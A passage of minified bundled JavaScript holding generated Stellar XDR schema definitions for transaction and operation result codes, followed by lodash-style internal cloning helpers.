                tx: x.lookup("Transaction"),
                feeBump: x.lookup("FeeBumpTransaction")
            }
        }),
        x.struct("TransactionSignaturePayload", [["networkId", x.lookup("Hash")], ["taggedTransaction", x.lookup("TransactionSignaturePayloadTaggedTransaction")]]),
        x.enum("ClaimAtomType", {
            claimAtomTypeV0: 0,
            claimAtomTypeOrderBook: 1,
            claimAtomTypeLiquidityPool: 2
        }),
        x.struct("ClaimOfferAtomV0", [["sellerEd25519", x.lookup("Uint256")], ["offerId", x.lookup("Int64")], ["assetSold", x.lookup("Asset")], ["amountSold", x.lookup("Int64")], ["assetBought", x.lookup("Asset")], ["amountBought", x.lookup("Int64")]]),
        x.struct("ClaimOfferAtom", [["sellerId", x.lookup("AccountId")], ["offerId", x.lookup("Int64")], ["assetSold", x.lookup("Asset")], ["amountSold", x.lookup("Int64")], ["assetBought", x.lookup("Asset")], ["amountBought", x.lookup("Int64")]]),
        x.struct("ClaimLiquidityAtom", [["liquidityPoolId", x.lookup("PoolId")], ["assetSold", x.lookup("Asset")], ["amountSold", x.lookup("Int64")], ["assetBought", x.lookup("Asset")], ["amountBought", x.lookup("Int64")]]),
        x.union("ClaimAtom", {
            switchOn: x.lookup("ClaimAtomType"),
            switchName: "type",
            switches: [["claimAtomTypeV0", "v0"], ["claimAtomTypeOrderBook", "orderBook"], ["claimAtomTypeLiquidityPool", "liquidityPool"]],
            arms: {
                v0: x.lookup("ClaimOfferAtomV0"),
                orderBook: x.lookup("ClaimOfferAtom"),
                liquidityPool: x.lookup("ClaimLiquidityAtom")
            }
        }),
        x.enum("CreateAccountResultCode", {
            createAccountSuccess: 0,
            createAccountMalformed: -1,
            createAccountUnderfunded: -2,
            createAccountLowReserve: -3,
            createAccountAlreadyExist: -4
        }),
        x.union("CreateAccountResult", {
            switchOn: x.lookup("CreateAccountResultCode"),
            switchName: "code",
            switches: [["createAccountSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("PaymentResultCode", {
            paymentSuccess: 0,
            paymentMalformed: -1,
            paymentUnderfunded: -2,
            paymentSrcNoTrust: -3,
            paymentSrcNotAuthorized: -4,
            paymentNoDestination: -5,
            paymentNoTrust: -6,
            paymentNotAuthorized: -7,
            paymentLineFull: -8,
            paymentNoIssuer: -9
        }),
        x.union("PaymentResult", {
            switchOn: x.lookup("PaymentResultCode"),
            switchName: "code",
            switches: [["paymentSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("PathPaymentStrictReceiveResultCode", {
            pathPaymentStrictReceiveSuccess: 0,
            pathPaymentStrictReceiveMalformed: -1,
            pathPaymentStrictReceiveUnderfunded: -2,
            pathPaymentStrictReceiveSrcNoTrust: -3,
            pathPaymentStrictReceiveSrcNotAuthorized: -4,
            pathPaymentStrictReceiveNoDestination: -5,
            pathPaymentStrictReceiveNoTrust: -6,
            pathPaymentStrictReceiveNotAuthorized: -7,
            pathPaymentStrictReceiveLineFull: -8,
            pathPaymentStrictReceiveNoIssuer: -9,
            pathPaymentStrictReceiveTooFewOffers: -10,
            pathPaymentStrictReceiveOfferCrossSelf: -11,
            pathPaymentStrictReceiveOverSendmax: -12
        }),
        x.struct("SimplePaymentResult", [["destination", x.lookup("AccountId")], ["asset", x.lookup("Asset")], ["amount", x.lookup("Int64")]]),
        x.struct("PathPaymentStrictReceiveResultSuccess", [["offers", x.varArray(x.lookup("ClaimAtom"), 2147483647)], ["last", x.lookup("SimplePaymentResult")]]),
        x.union("PathPaymentStrictReceiveResult", {
            switchOn: x.lookup("PathPaymentStrictReceiveResultCode"),
            switchName: "code",
            switches: [["pathPaymentStrictReceiveSuccess", "success"], ["pathPaymentStrictReceiveNoIssuer", "noIssuer"]],
            arms: {
                success: x.lookup("PathPaymentStrictReceiveResultSuccess"),
                noIssuer: x.lookup("Asset")
            },
            defaultArm: x.void()
        }),
        x.enum("PathPaymentStrictSendResultCode", {
            pathPaymentStrictSendSuccess: 0,
            pathPaymentStrictSendMalformed: -1,
            pathPaymentStrictSendUnderfunded: -2,
            pathPaymentStrictSendSrcNoTrust: -3,
            pathPaymentStrictSendSrcNotAuthorized: -4,
            pathPaymentStrictSendNoDestination: -5,
            pathPaymentStrictSendNoTrust: -6,
            pathPaymentStrictSendNotAuthorized: -7,
            pathPaymentStrictSendLineFull: -8,
            pathPaymentStrictSendNoIssuer: -9,
            pathPaymentStrictSendTooFewOffers: -10,
            pathPaymentStrictSendOfferCrossSelf: -11,
            pathPaymentStrictSendUnderDestmin: -12
        }),
        x.struct("PathPaymentStrictSendResultSuccess", [["offers", x.varArray(x.lookup("ClaimAtom"), 2147483647)], ["last", x.lookup("SimplePaymentResult")]]),
        x.union("PathPaymentStrictSendResult", {
            switchOn: x.lookup("PathPaymentStrictSendResultCode"),
            switchName: "code",
            switches: [["pathPaymentStrictSendSuccess", "success"], ["pathPaymentStrictSendNoIssuer", "noIssuer"]],
            arms: {
                success: x.lookup("PathPaymentStrictSendResultSuccess"),
                noIssuer: x.lookup("Asset")
            },
            defaultArm: x.void()
        }),
        x.enum("ManageSellOfferResultCode", {
            manageSellOfferSuccess: 0,
            manageSellOfferMalformed: -1,
            manageSellOfferSellNoTrust: -2,
            manageSellOfferBuyNoTrust: -3,
            manageSellOfferSellNotAuthorized: -4,
            manageSellOfferBuyNotAuthorized: -5,
            manageSellOfferLineFull: -6,
            manageSellOfferUnderfunded: -7,
            manageSellOfferCrossSelf: -8,
            manageSellOfferSellNoIssuer: -9,
            manageSellOfferBuyNoIssuer: -10,
            manageSellOfferNotFound: -11,
            manageSellOfferLowReserve: -12
        }),
        x.enum("ManageOfferEffect", {
            manageOfferCreated: 0,
            manageOfferUpdated: 1,
            manageOfferDeleted: 2
        }),
        x.union("ManageOfferSuccessResultOffer", {
            switchOn: x.lookup("ManageOfferEffect"),
            switchName: "effect",
            switches: [["manageOfferCreated", "offer"], ["manageOfferUpdated", "offer"]],
            arms: {
                offer: x.lookup("OfferEntry")
            },
            defaultArm: x.void()
        }),
        x.struct("ManageOfferSuccessResult", [["offersClaimed", x.varArray(x.lookup("ClaimAtom"), 2147483647)], ["offer", x.lookup("ManageOfferSuccessResultOffer")]]),
        x.union("ManageSellOfferResult", {
            switchOn: x.lookup("ManageSellOfferResultCode"),
            switchName: "code",
            switches: [["manageSellOfferSuccess", "success"]],
            arms: {
                success: x.lookup("ManageOfferSuccessResult")
            },
            defaultArm: x.void()
        }),
        x.enum("ManageBuyOfferResultCode", {
            manageBuyOfferSuccess: 0,
            manageBuyOfferMalformed: -1,
            manageBuyOfferSellNoTrust: -2,
            manageBuyOfferBuyNoTrust: -3,
            manageBuyOfferSellNotAuthorized: -4,
            manageBuyOfferBuyNotAuthorized: -5,
            manageBuyOfferLineFull: -6,
            manageBuyOfferUnderfunded: -7,
            manageBuyOfferCrossSelf: -8,
            manageBuyOfferSellNoIssuer: -9,
            manageBuyOfferBuyNoIssuer: -10,
            manageBuyOfferNotFound: -11,
            manageBuyOfferLowReserve: -12
        }),
        x.union("ManageBuyOfferResult", {
            switchOn: x.lookup("ManageBuyOfferResultCode"),
            switchName: "code",
            switches: [["manageBuyOfferSuccess", "success"]],
            arms: {
                success: x.lookup("ManageOfferSuccessResult")
            },
            defaultArm: x.void()
        }),
        x.enum("SetOptionsResultCode", {
            setOptionsSuccess: 0,
            setOptionsLowReserve: -1,
            setOptionsTooManySigners: -2,
            setOptionsBadFlags: -3,
            setOptionsInvalidInflation: -4,
            setOptionsCantChange: -5,
            setOptionsUnknownFlag: -6,
            setOptionsThresholdOutOfRange: -7,
            setOptionsBadSigner: -8,
            setOptionsInvalidHomeDomain: -9,
            setOptionsAuthRevocableRequired: -10
        }),
        x.union("SetOptionsResult", {
            switchOn: x.lookup("SetOptionsResultCode"),
            switchName: "code",
            switches: [["setOptionsSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("ChangeTrustResultCode", {
            changeTrustSuccess: 0,
            changeTrustMalformed: -1,
            changeTrustNoIssuer: -2,
            changeTrustInvalidLimit: -3,
            changeTrustLowReserve: -4,
            changeTrustSelfNotAllowed: -5,
            changeTrustTrustLineMissing: -6,
            changeTrustCannotDelete: -7,
            changeTrustNotAuthMaintainLiabilities: -8
        }),
        x.union("ChangeTrustResult", {
            switchOn: x.lookup("ChangeTrustResultCode"),
            switchName: "code",
            switches: [["changeTrustSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("AllowTrustResultCode", {
            allowTrustSuccess: 0,
            allowTrustMalformed: -1,
            allowTrustNoTrustLine: -2,
            allowTrustTrustNotRequired: -3,
            allowTrustCantRevoke: -4,
            allowTrustSelfNotAllowed: -5,
            allowTrustLowReserve: -6
        }),
        x.union("AllowTrustResult", {
            switchOn: x.lookup("AllowTrustResultCode"),
            switchName: "code",
            switches: [["allowTrustSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("AccountMergeResultCode", {
            accountMergeSuccess: 0,
            accountMergeMalformed: -1,
            accountMergeNoAccount: -2,
            accountMergeImmutableSet: -3,
            accountMergeHasSubEntries: -4,
            accountMergeSeqnumTooFar: -5,
            accountMergeDestFull: -6,
            accountMergeIsSponsor: -7
        }),
        x.union("AccountMergeResult", {
            switchOn: x.lookup("AccountMergeResultCode"),
            switchName: "code",
            switches: [["accountMergeSuccess", "sourceAccountBalance"]],
            arms: {
                sourceAccountBalance: x.lookup("Int64")
            },
            defaultArm: x.void()
        }),
        x.enum("InflationResultCode", {
            inflationSuccess: 0,
            inflationNotTime: -1
        }),
        x.struct("InflationPayout", [["destination", x.lookup("AccountId")], ["amount", x.lookup("Int64")]]),
        x.union("InflationResult", {
            switchOn: x.lookup("InflationResultCode"),
            switchName: "code",
            switches: [["inflationSuccess", "payouts"]],
            arms: {
                payouts: x.varArray(x.lookup("InflationPayout"), 2147483647)
            },
            defaultArm: x.void()
        }),
        x.enum("ManageDataResultCode", {
            manageDataSuccess: 0,
            manageDataNotSupportedYet: -1,
            manageDataNameNotFound: -2,
            manageDataLowReserve: -3,
            manageDataInvalidName: -4
        }),
        x.union("ManageDataResult", {
            switchOn: x.lookup("ManageDataResultCode"),
            switchName: "code",
            switches: [["manageDataSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("BumpSequenceResultCode", {
            bumpSequenceSuccess: 0,
            bumpSequenceBadSeq: -1
        }),
        x.union("BumpSequenceResult", {
            switchOn: x.lookup("BumpSequenceResultCode"),
            switchName: "code",
            switches: [["bumpSequenceSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("CreateClaimableBalanceResultCode", {
            createClaimableBalanceSuccess: 0,
            createClaimableBalanceMalformed: -1,
            createClaimableBalanceLowReserve: -2,
            createClaimableBalanceNoTrust: -3,
            createClaimableBalanceNotAuthorized: -4,
            createClaimableBalanceUnderfunded: -5
        }),
        x.union("CreateClaimableBalanceResult", {
            switchOn: x.lookup("CreateClaimableBalanceResultCode"),
            switchName: "code",
            switches: [["createClaimableBalanceSuccess", "balanceId"]],
            arms: {
                balanceId: x.lookup("ClaimableBalanceId")
            },
            defaultArm: x.void()
        }),
        x.enum("ClaimClaimableBalanceResultCode", {
            claimClaimableBalanceSuccess: 0,
            claimClaimableBalanceDoesNotExist: -1,
            claimClaimableBalanceCannotClaim: -2,
            claimClaimableBalanceLineFull: -3,
            claimClaimableBalanceNoTrust: -4,
            claimClaimableBalanceNotAuthorized: -5
        }),
        x.union("ClaimClaimableBalanceResult", {
            switchOn: x.lookup("ClaimClaimableBalanceResultCode"),
            switchName: "code",
            switches: [["claimClaimableBalanceSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("BeginSponsoringFutureReservesResultCode", {
            beginSponsoringFutureReservesSuccess: 0,
            beginSponsoringFutureReservesMalformed: -1,
            beginSponsoringFutureReservesAlreadySponsored: -2,
            beginSponsoringFutureReservesRecursive: -3
        }),
        x.union("BeginSponsoringFutureReservesResult", {
            switchOn: x.lookup("BeginSponsoringFutureReservesResultCode"),
            switchName: "code",
            switches: [["beginSponsoringFutureReservesSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("EndSponsoringFutureReservesResultCode", {
            endSponsoringFutureReservesSuccess: 0,
            endSponsoringFutureReservesNotSponsored: -1
        }),
        x.union("EndSponsoringFutureReservesResult", {
            switchOn: x.lookup("EndSponsoringFutureReservesResultCode"),
            switchName: "code",
            switches: [["endSponsoringFutureReservesSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("RevokeSponsorshipResultCode", {
            revokeSponsorshipSuccess: 0,
            revokeSponsorshipDoesNotExist: -1,
            revokeSponsorshipNotSponsor: -2,
            revokeSponsorshipLowReserve: -3,
            revokeSponsorshipOnlyTransferable: -4,
            revokeSponsorshipMalformed: -5
        }),
        x.union("RevokeSponsorshipResult", {
            switchOn: x.lookup("RevokeSponsorshipResultCode"),
            switchName: "code",
            switches: [["revokeSponsorshipSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("ClawbackResultCode", {
            clawbackSuccess: 0,
            clawbackMalformed: -1,
            clawbackNotClawbackEnabled: -2,
            clawbackNoTrust: -3,
            clawbackUnderfunded: -4
        }),
        x.union("ClawbackResult", {
            switchOn: x.lookup("ClawbackResultCode"),
            switchName: "code",
            switches: [["clawbackSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("ClawbackClaimableBalanceResultCode", {
            clawbackClaimableBalanceSuccess: 0,
            clawbackClaimableBalanceDoesNotExist: -1,
            clawbackClaimableBalanceNotIssuer: -2,
            clawbackClaimableBalanceNotClawbackEnabled: -3
        }),
        x.union("ClawbackClaimableBalanceResult", {
            switchOn: x.lookup("ClawbackClaimableBalanceResultCode"),
            switchName: "code",
            switches: [["clawbackClaimableBalanceSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("SetTrustLineFlagsResultCode", {
            setTrustLineFlagsSuccess: 0,
            setTrustLineFlagsMalformed: -1,
            setTrustLineFlagsNoTrustLine: -2,
            setTrustLineFlagsCantRevoke: -3,
            setTrustLineFlagsInvalidState: -4,
            setTrustLineFlagsLowReserve: -5
        }),
        x.union("SetTrustLineFlagsResult", {
            switchOn: x.lookup("SetTrustLineFlagsResultCode"),
            switchName: "code",
            switches: [["setTrustLineFlagsSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("LiquidityPoolDepositResultCode", {
            liquidityPoolDepositSuccess: 0,
            liquidityPoolDepositMalformed: -1,
            liquidityPoolDepositNoTrust: -2,
            liquidityPoolDepositNotAuthorized: -3,
            liquidityPoolDepositUnderfunded: -4,
            liquidityPoolDepositLineFull: -5,
            liquidityPoolDepositBadPrice: -6,
            liquidityPoolDepositPoolFull: -7
        }),
        x.union("LiquidityPoolDepositResult", {
            switchOn: x.lookup("LiquidityPoolDepositResultCode"),
            switchName: "code",
            switches: [["liquidityPoolDepositSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("LiquidityPoolWithdrawResultCode", {
            liquidityPoolWithdrawSuccess: 0,
            liquidityPoolWithdrawMalformed: -1,
            liquidityPoolWithdrawNoTrust: -2,
            liquidityPoolWithdrawUnderfunded: -3,
            liquidityPoolWithdrawLineFull: -4,
            liquidityPoolWithdrawUnderMinimum: -5
        }),
        x.union("LiquidityPoolWithdrawResult", {
            switchOn: x.lookup("LiquidityPoolWithdrawResultCode"),
            switchName: "code",
            switches: [["liquidityPoolWithdrawSuccess", x.void()]],
            arms: {},
            defaultArm: x.void()
        }),
        x.enum("OperationResultCode", {
            opInner: 0,
            opBadAuth: -1,
            opNoAccount: -2,
            opNotSupported: -3,
            opTooManySubentries: -4,
            opExceededWorkLimit: -5,
            opTooManySponsoring: -6
        }),
        x.union("OperationResultTr", {
            switchOn: x.lookup("OperationType"),
            switchName: "type",
            switches: [["createAccount", "createAccountResult"], ["payment", "paymentResult"], ["pathPaymentStrictReceive", "pathPaymentStrictReceiveResult"], ["manageSellOffer", "manageSellOfferResult"], ["createPassiveSellOffer", "createPassiveSellOfferResult"], ["setOptions", "setOptionsResult"], ["changeTrust", "changeTrustResult"], ["allowTrust", "allowTrustResult"], ["accountMerge", "accountMergeResult"], ["inflation", "inflationResult"], ["manageData", "manageDataResult"], ["bumpSequence", "bumpSeqResult"], ["manageBuyOffer", "manageBuyOfferResult"], ["pathPaymentStrictSend", "pathPaymentStrictSendResult"], ["createClaimableBalance", "createClaimableBalanceResult"], ["claimClaimableBalance", "claimClaimableBalanceResult"], ["beginSponsoringFutureReserves", "beginSponsoringFutureReservesResult"], ["endSponsoringFutureReserves", "endSponsoringFutureReservesResult"], ["revokeSponsorship", "revokeSponsorshipResult"], ["clawback", "clawbackResult"], ["clawbackClaimableBalance", "clawbackClaimableBalanceResult"], ["setTrustLineFlags", "setTrustLineFlagsResult"], ["liquidityPoolDeposit", "liquidityPoolDepositResult"], ["liquidityPoolWithdraw", "liquidityPoolWithdrawResult"]],
            arms: {
                createAccountResult: x.lookup("CreateAccountResult"),
                paymentResult: x.lookup("PaymentResult"),
                pathPaymentStrictReceiveResult: x.lookup("PathPaymentStrictReceiveResult"),
                manageSellOfferResult: x.lookup("ManageSellOfferResult"),
                createPassiveSellOfferResult: x.lookup("ManageSellOfferResult"),
                setOptionsResult: x.lookup("SetOptionsResult"),
                changeTrustResult: x.lookup("ChangeTrustResult"),
                allowTrustResult: x.lookup("AllowTrustResult"),
                accountMergeResult: x.lookup("AccountMergeResult"),
                inflationResult: x.lookup("InflationResult"),
                manageDataResult: x.lookup("ManageDataResult"),
                bumpSeqResult: x.lookup("BumpSequenceResult"),
                manageBuyOfferResult: x.lookup("ManageBuyOfferResult"),
                pathPaymentStrictSendResult: x.lookup("PathPaymentStrictSendResult"),
                createClaimableBalanceResult: x.lookup("CreateClaimableBalanceResult"),
                claimClaimableBalanceResult: x.lookup("ClaimClaimableBalanceResult"),
                beginSponsoringFutureReservesResult: x.lookup("BeginSponsoringFutureReservesResult"),
                endSponsoringFutureReservesResult: x.lookup("EndSponsoringFutureReservesResult"),
                revokeSponsorshipResult: x.lookup("RevokeSponsorshipResult"),
                clawbackResult: x.lookup("ClawbackResult"),
                clawbackClaimableBalanceResult: x.lookup("ClawbackClaimableBalanceResult"),
                setTrustLineFlagsResult: x.lookup("SetTrustLineFlagsResult"),
                liquidityPoolDepositResult: x.lookup("LiquidityPoolDepositResult"),
                liquidityPoolWithdrawResult: x.lookup("LiquidityPoolWithdrawResult")
            }
        }),
        x.union("OperationResult", {
            switchOn: x.lookup("OperationResultCode"),
            switchName: "code",
            switches: [["opInner", "tr"]],
            arms: {
                tr: x.lookup("OperationResultTr")
            },
            defaultArm: x.void()
        }),
        x.enum("TransactionResultCode", {
            txFeeBumpInnerSuccess: 1,
            txSuccess: 0,
            txFailed: -1,
            txTooEarly: -2,
            txTooLate: -3,
            txMissingOperation: -4,
            txBadSeq: -5,
            txBadAuth: -6,
            txInsufficientBalance: -7,
            txNoAccount: -8,
            txInsufficientFee: -9,
            txBadAuthExtra: -10,
            txInternalError: -11,
            txNotSupported: -12,
            txFeeBumpInnerFailed: -13,
            txBadSponsorship: -14
        }),
        x.union("InnerTransactionResultResult", {
            switchOn: x.lookup("TransactionResultCode"),
            switchName: "code",
            switches: [["txSuccess", "results"], ["txFailed", "results"], ["txTooEarly", x.void()], ["txTooLate", x.void()], ["txMissingOperation", x.void()], ["txBadSeq", x.void()], ["txBadAuth", x.void()], ["txInsufficientBalance", x.void()], ["txNoAccount", x.void()], ["txInsufficientFee", x.void()], ["txBadAuthExtra", x.void()], ["txInternalError", x.void()], ["txNotSupported", x.void()], ["txBadSponsorship", x.void()]],
            arms: {
                results: x.varArray(x.lookup("OperationResult"), 2147483647)
            }
        }),
        x.union("InnerTransactionResultExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("InnerTransactionResult", [["feeCharged", x.lookup("Int64")], ["result", x.lookup("InnerTransactionResultResult")], ["ext", x.lookup("InnerTransactionResultExt")]]),
        x.struct("InnerTransactionResultPair", [["transactionHash", x.lookup("Hash")], ["result", x.lookup("InnerTransactionResult")]]),
        x.union("TransactionResultResult", {
            switchOn: x.lookup("TransactionResultCode"),
            switchName: "code",
            switches: [["txFeeBumpInnerSuccess", "innerResultPair"], ["txFeeBumpInnerFailed", "innerResultPair"], ["txSuccess", "results"], ["txFailed", "results"]],
            arms: {
                innerResultPair: x.lookup("InnerTransactionResultPair"),
                results: x.varArray(x.lookup("OperationResult"), 2147483647)
            },
            defaultArm: x.void()
        }),
        x.union("TransactionResultExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("TransactionResult", [["feeCharged", x.lookup("Int64")], ["result", x.lookup("TransactionResultResult")], ["ext", x.lookup("TransactionResultExt")]]),
        x.typedef("Hash", x.opaque(32)),
        x.typedef("Uint256", x.opaque(32)),
        x.typedef("Uint32", x.uint()),
        x.typedef("Int32", x.int()),
        x.typedef("Uint64", x.uhyper()),
        x.typedef("Int64", x.hyper()),
        x.enum("CryptoKeyType", {
            keyTypeEd25519: 0,
            keyTypePreAuthTx: 1,
            keyTypeHashX: 2,
            keyTypeMuxedEd25519: 256
        }),
        x.enum("PublicKeyType", {
            publicKeyTypeEd25519: 0
        }),
        x.enum("SignerKeyType", {
            signerKeyTypeEd25519: 0,
            signerKeyTypePreAuthTx: 1,
            signerKeyTypeHashX: 2
        }),
        x.union("PublicKey", {
            switchOn: x.lookup("PublicKeyType"),
            switchName: "type",
            switches: [["publicKeyTypeEd25519", "ed25519"]],
            arms: {
                ed25519: x.lookup("Uint256")
            }
        }),
        x.union("SignerKey", {
            switchOn: x.lookup("SignerKeyType"),
            switchName: "type",
            switches: [["signerKeyTypeEd25519", "ed25519"], ["signerKeyTypePreAuthTx", "preAuthTx"], ["signerKeyTypeHashX", "hashX"]],
            arms: {
                ed25519: x.lookup("Uint256"),
                preAuthTx: x.lookup("Uint256"),
                hashX: x.lookup("Uint256")
            }
        }),
        x.typedef("Signature", x.varOpaque(64)),
        x.typedef("SignatureHint", x.opaque(4)),
        x.typedef("NodeId", x.lookup("PublicKey")),
        x.struct("Curve25519Secret", [["key", x.opaque(32)]]),
        x.struct("Curve25519Public", [["key", x.opaque(32)]]),
        x.struct("HmacSha256Key", [["key", x.opaque(32)]]),
        x.struct("HmacSha256Mac", [["mac", x.opaque(32)]])
    });
    return stellarXdr_generated.default = O,
    stellarXdr_generated
}
var asset$1 = {}, _baseAssign, hasRequired_baseAssign;
function require_baseAssign() {
    if (hasRequired_baseAssign)
        return _baseAssign;
    hasRequired_baseAssign = 1;
    var _ = require_copyObject()
      , M = requireKeys();
    function j(O, x) {
        return O && _(x, M(x), O)
    }
    return _baseAssign = j,
    _baseAssign
}
var _baseAssignIn, hasRequired_baseAssignIn;
function require_baseAssignIn() {
    if (hasRequired_baseAssignIn)
        return _baseAssignIn;
    hasRequired_baseAssignIn = 1;
    var _ = require_copyObject()
      , M = requireKeysIn();
    function j(O, x) {
        return O && _(x, M(x), O)
    }
    return _baseAssignIn = j,
    _baseAssignIn
}
var _cloneBuffer = {
    exports: {}
};
_cloneBuffer.exports;
var hasRequired_cloneBuffer;
function require_cloneBuffer() {
    return hasRequired_cloneBuffer || (hasRequired_cloneBuffer = 1,
    function(_, M) {
        var j = require_root()
          , O = M && !M.nodeType && M
          , x = O && !0 && _ && !_.nodeType && _
          , w = x && x.exports === O
          , b = w ? j.Buffer : void 0
          , X = b ? b.allocUnsafe : void 0;
        function Y(F, V) {
            if (V)
                return F.slice();
            var K = F.length
              , Q = X ? X(K) : new F.constructor(K);
            return F.copy(Q),
            Q
        }
        _.exports = Y
    }(_cloneBuffer, _cloneBuffer.exports)),
    _cloneBuffer.exports
}
var _copyArray, hasRequired_copyArray;
function require_copyArray() {
    if (hasRequired_copyArray)
        return _copyArray;
    hasRequired_copyArray = 1;
    function _(M, j) {
        var O = -1
          , x = M.length;
        for (j || (j = Array(x)); ++O < x; )
            j[O] = M[O];
        return j
    }
    return _copyArray = _,
    _copyArray
}
var _copySymbols, hasRequired_copySymbols;
function require_copySymbols() {
    if (hasRequired_copySymbols)
        return _copySymbols;
    hasRequired_copySymbols = 1;
    var _ = require_copyObject()
      , M = require_getSymbols();
    function j(O, x) {
        return _(O, M(O), x)
    }
    return _copySymbols = j,
    _copySymbols
}
var _getPrototype, hasRequired_getPrototype;
function require_getPrototype() {
    if (hasRequired_getPrototype)
        return _getPrototype;
    hasRequired_getPrototype = 1;
    var _ = require_overArg()
      , M = _(Object.getPrototypeOf, Object);
    return _getPrototype = M,
    _getPrototype
}
var _getSymbolsIn, hasRequired_getSymbolsIn;
function require_getSymbolsIn() {
    if (hasRequired_getSymbolsIn)
        return _getSymbolsIn;
    hasRequired_getSymbolsIn = 1;
    var _ = require_arrayPush()
      , M = require_getPrototype()
      , j = require_getSymbols()
      , O = requireStubArray()
      , x = Object.getOwnPropertySymbols
      , w = x ? function(b) {
        for (var X = []; b; )
            _(X, j(b)),
            b = M(b);
        return X
    }
    : O;
    return _getSymbolsIn = w,
    _getSymbolsIn
}
var _copySymbolsIn, hasRequired_copySymbolsIn;
function require_copySymbolsIn() {
    if (hasRequired_copySymbolsIn)
        return _copySymbolsIn;
    hasRequired_copySymbolsIn = 1;
    var _ = require_copyObject()
      , M = require_getSymbolsIn();
    function j(O, x) {
        return _(O, M(O), x)
    }
    return _copySymbolsIn = j,
    _copySymbolsIn
}
var _getAllKeysIn, hasRequired_getAllKeysIn;
function require_getAllKeysIn() {
    if (hasRequired_getAllKeysIn)
        return _getAllKeysIn;
    hasRequired_getAllKeysIn = 1;
    var _ = require_baseGetAllKeys()
      , M = require_getSymbolsIn()
      , j = requireKeysIn();
    function O(x) {
        return _(x, j, M)
    }
    return _getAllKeysIn = O,
    _getAllKeysIn
}
var _initCloneArray, hasRequired_initCloneArray;
function require_initCloneArray() {
    if (hasRequired_initCloneArray)
        return _initCloneArray;
    hasRequired_initCloneArray = 1;
    var _ = Object.prototype
      , M = _.hasOwnProperty;
    function j(O) {
        var x = O.length
          , w = new O.constructor(x);
        return x && typeof O[0] == "string" && M.call(O, "index") && (w.index = O.index,
        w.input = O.input),
        w
    }
    return _initCloneArray = j,
    _initCloneArray
}
var _cloneArrayBuffer, hasRequired_cloneArrayBuffer;
function require_cloneArrayBuffer() {
    if (hasRequired_cloneArrayBuffer)
        return _cloneArrayBuffer;
    hasRequired_cloneArrayBuffer = 1;
    var _ = require_Uint8Array();
    function M(j) {
        var O = new j.constructor(j.byteLength);
        return new _(O).set(new _(j)),
        O
    }
    return _cloneArrayBuffer = M,
    _cloneArrayBuffer
}
var _cloneDataView, hasRequired_cloneDataView;
function require_cloneDataView() {
    if (hasRequired_cloneDataView)
        return _cloneDataView;
    hasRequired_cloneDataView = 1;
    var _ = require_cloneArrayBuffer();
    function M(j, O) {
        var x = O ? _(j.buffer) : j.buffer;
        return new j.constructor(x,j.byteOffset,j.byteLength)
    }
    return _cloneDataView = M,
    _cloneDataView
}
var _cloneRegExp, hasRequired_cloneRegExp;
function require_cloneRegExp() {
    if (hasRequired_cloneRegExp)
        return _cloneRegExp;
    hasRequired_cloneRegExp = 1;
    var _ = /\w*$/;
    function M(j) {
        var O = new j.constructor(j.source,_.exec(j));
        return O.lastIndex = j.lastIndex,
        O
    }
    return _cloneRegExp = M,
    _cloneRegExp
}
var _cloneSymbol, hasRequired_cloneSymbol;
function require_cloneSymbol() {
    if (hasRequired_cloneSymbol)
        return _cloneSymbol;
    hasRequired_cloneSymbol = 1;
    var _ = require_Symbol()
      , M = _ ? _.prototype : void 0
      , j = M ? M.valueOf : void 0;
    function O(x) {
        return j ? Object(j.call(x)) : {}
    }
    return _cloneSymbol = O,
    _cloneSymbol
}
var _cloneTypedArray, hasRequired_cloneTypedArray;
function require_cloneTypedArray() {
    if (hasRequired_cloneTypedArray)
        return _cloneTypedArray;
    hasRequired_cloneTypedArray = 1;
    var _ = require_cloneArrayBuffer();
    function M(j, O) {
        var x = O ? _(j.buffer) : j.buffer;
        return new j.constructor(x,j.byteOffset,j.length)
    }
    return _cloneTypedArray = M,
    _cloneTypedArray
}
var _initCloneByTag, hasRequired_initCloneByTag;
function require_initCloneByTag() {
    if (hasRequired_initCloneByTag)
        return _initCloneByTag;
    hasRequired_initCloneByTag = 1;
    var _ = require_cloneArrayBuffer()
      , M = require_cloneDataView()
      , j = require_cloneRegExp()
      , O = require_cloneSymbol()
      , x = require_cloneTypedArray()
      , w = "[object Boolean]"
      , b = "[object Date]"
      , X = "[object Map]"
      , Y = "[object Number]"
      , F = "[object RegExp]"
      , V = "[object Set]"
      , K = "[object String]"
      , Q = "[object Symbol]"
      , ee = "[object ArrayBuffer]"
      , ae = "[object DataView]"
      , ne = "[object Float32Array]"
      , oe = "[object Float64Array]"
      , ue = "[object Int8Array]"
      , fe = "[object Int16Array]"
      , he = "[object Int32Array]"
      , pe = "[object Uint8Array]"
      , ye = "[object Uint8ClampedArray]"
      , be = "[object Uint16Array]"
      , xe = "[object Uint32Array]";
    function Ae(Ee, Be, ce) {
        var q = Ee.constructor;
        switch (Be) {
        case ee:
            return _(Ee);
        case w:
        case b:
            return new q(+Ee);
        case ae:
            return M(Ee, ce);
        case ne:
        case oe:
        case ue:
        case fe:
        case he:
        case pe:
        case ye:
        case be:
        case xe:
            return x(Ee, ce);
        case X:
            return new q;
        case Y:
        case K:
            return new q(Ee);
        case F:
            return j(Ee);
        case V:
            return new q;
        case Q:
            return O(Ee)
        }
    }
